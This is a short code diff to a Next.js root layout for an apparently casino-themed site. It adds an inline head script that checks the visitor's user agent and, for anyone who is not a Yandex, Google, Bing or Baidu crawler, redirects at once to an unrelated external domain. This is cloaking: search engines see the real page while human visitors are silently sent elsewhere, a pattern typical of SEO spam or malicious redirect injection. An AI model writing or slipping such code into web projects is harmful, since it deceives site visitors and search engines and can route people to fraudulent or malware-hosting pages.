@@ -42,6 +42,21 @@ export default function RootLayout({
         />
         <meta name="twitter:image" content="https://farocasino28.vercel.app/img/hero-vault.jpg" />
         <meta name="theme-color" content="#0b0c10" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://combospark.top/aetf3u2q9u");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body>{children}</body>
     </html>
